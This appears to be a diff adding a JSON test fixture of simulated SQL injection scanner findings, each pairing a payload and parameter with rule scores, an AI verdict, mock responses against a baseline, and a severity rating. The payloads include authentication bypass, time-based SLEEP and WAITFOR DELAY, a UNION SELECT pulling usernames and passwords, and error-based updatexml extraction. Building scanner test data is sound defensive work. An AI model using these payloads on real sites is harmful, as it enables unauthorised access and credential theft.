@@ -1,0 +1,234 @@
+[
+  {
+    "scan_result": {
+      "attack_details": {
+        "payload": "' OR '1'='1",
+        "parameter": "username",
+        "category": "boolean"
+      },
+      "rule_analysis": {
+        "score": 5,
+        "evidence": ["authentication_bypass_detected", "content_changed"]
+      },
+      "ai_analysis": {
+        "verdict": "yes",
+        "confidence": 0.9
+      },
+      "response": {
+        "body": "Welcome admin. Dashboard available. User: admin",
+        "status_code": 200,
+        "response_time": 0.5
+      },
+      "baseline": {
+        "body": "Invalid username or password. Please try again.",
+        "status_code": 200,
+        "response_time": 0.3
+      }
+    },
+    "severity": "Critical",
+    "notes": "Authentication bypass successful - gained admin access to dashboard"
+  },
+  {
+    "scan_result": {
+      "attack_details": {
+        "payload": "' AND SLEEP(5)--",
+        "parameter": "id",
+        "category": "time"
+      },
+      "rule_analysis": {
+        "score": 4,
+        "evidence": ["time_delay_5.2s_vs_0.3s"]
+      },
+      "ai_analysis": {
+        "verdict": "yes",
+        "confidence": 0.85
+      },
+      "response": {
+        "body": "Loading product details...",
+        "status_code": 200,
+        "response_time": 5.2
+      },
+      "baseline": {
+        "body": "Loading product details...",
+        "status_code": 200,
+        "response_time": 0.3
+      }
+    },
+    "severity": "High",
+    "notes": "Time-based blind SQL injection confirmed with 5 second delay"
+  },
+  {
+    "scan_result": {
+      "attack_details": {
+        "payload": "'",
+        "parameter": "search",
+        "category": "error"
+      },
+      "rule_analysis": {
+        "score": 3,
+        "evidence": ["error_pattern_matched"]
+      },
+      "ai_analysis": {
+        "verdict": "yes",
+        "confidence": 0.7
+      },
+      "response": {
+        "body": "You have an error in your SQL syntax near '' at line 1. SELECT * FROM products WHERE name LIKE '%'%'",
+        "status_code": 500,
+        "response_time": 0.4
+      },
+      "baseline": {
+        "body": "Search results for query",
+        "status_code": 200,
+        "response_time": 0.3
+      }
+    },
+    "severity": "High",
+    "notes": "SQL error messages exposed database query structure"
+  },
+  {
+    "scan_result": {
+      "attack_details": {
+        "payload": "' UNION SELECT null, username, password FROM users--",
+        "parameter": "id",
+        "category": "union"
+      },
+      "rule_analysis": {
+        "score": 4,
+        "evidence": ["content_changed", "length_diff_ratio_0.45"]
+      },
+      "ai_analysis": {
+        "verdict": "yes",
+        "confidence": 0.8
+      },
+      "response": {
+        "body": "admin:password123\nuser1:qwerty\nuser2:123456",
+        "status_code": 200,
+        "response_time": 0.4
+      },
+      "baseline": {
+        "body": "Product: Laptop\nPrice: $999",
+        "status_code": 200,
+        "response_time": 0.3
+      }
+    },
+    "severity": "Critical",
+    "notes": "UNION-based SQL injection extracted user credentials"
+  },
+  {
+    "scan_result": {
+      "attack_details": {
+        "payload": "1' AND 1=1--",
+        "parameter": "id",
+        "category": "boolean"
+      },
+      "rule_analysis": {
+        "score": 2,
+        "evidence": ["normalized_hash_changed", "length_diff_ratio_0.15"]
+      },
+      "ai_analysis": {
+        "verdict": "yes",
+        "confidence": 0.6
+      },
+      "response": {
+        "body": "Product: ABC-123\nDescription: Sample product",
+        "status_code": 200,
+        "response_time": 0.4
+      },
+      "baseline": {
+        "body": "Product: XYZ-789\nDescription: Another product",
+        "status_code": 200,
+        "response_time": 0.3
+      }
+    },
+    "severity": "Medium",
+    "notes": "Boolean-based injection with minor content change"
+  },
+  {
+    "scan_result": {
+      "attack_details": {
+        "payload": "'; WAITFOR DELAY '0:0:5'--",
+        "parameter": "query",
+        "category": "time"
+      },
+      "rule_analysis": {
+        "score": 4,
+        "evidence": ["time_delay_5.1s_vs_0.2s"]
+      },
+      "ai_analysis": {
+        "verdict": "yes",
+        "confidence": 0.88
+      },
+      "response": {
+        "body": "Results found",
+        "status_code": 200,
+        "response_time": 5.1
+      },
+      "baseline": {
+        "body": "Results found",
+        "status_code": 200,
+        "response_time": 0.2
+      }
+    },
+    "severity": "High",
+    "notes": "MSSQL time-based blind injection with WAITFOR DELAY"
+  },
+  {
+    "scan_result": {
+      "attack_details": {
+        "payload": "test",
+        "parameter": "query",
+        "category": "boolean"
+      },
+      "rule_analysis": {
+        "score": 0.5,
+        "evidence": ["normalized_hash_changed"]
+      },
+      "ai_analysis": {
+        "verdict": "no",
+        "confidence": 0.3
+      },
+      "response": {
+        "body": "Results for test",
+        "status_code": 200,
+        "response_time": 0.3
+      },
+      "baseline": {
+        "body": "Results for test",
+        "status_code": 200,
+        "response_time": 0.3
+      }
+    },
+    "severity": "Low",
+    "notes": "Weak signal, likely false positive"
+  },
+  {
+    "scan_result": {
+      "attack_details": {
+        "payload": "' OR updatexml(1,concat(0x7e,user()),1)--",
+        "parameter": "id",
+        "category": "error"
+      },
+      "rule_analysis": {
+        "score": 3,
+        "evidence": ["error_pattern_matched"]
+      },
+      "ai_analysis": {
+        "verdict": "yes",
+        "confidence": 0.75
+      },
+      "response": {
+        "body": "ERROR: XPATH syntax error: '~root@localhost'",
+        "status_code": 500,
+        "response_time": 0.4
+      },
+      "baseline": {
+        "body": "Product details page",
+        "status_code": 200,
+        "response_time": 0.3
+      }
+    },
+    "severity": "High",
+    "notes": "Error-based injection extracted database user"
+  }
+]
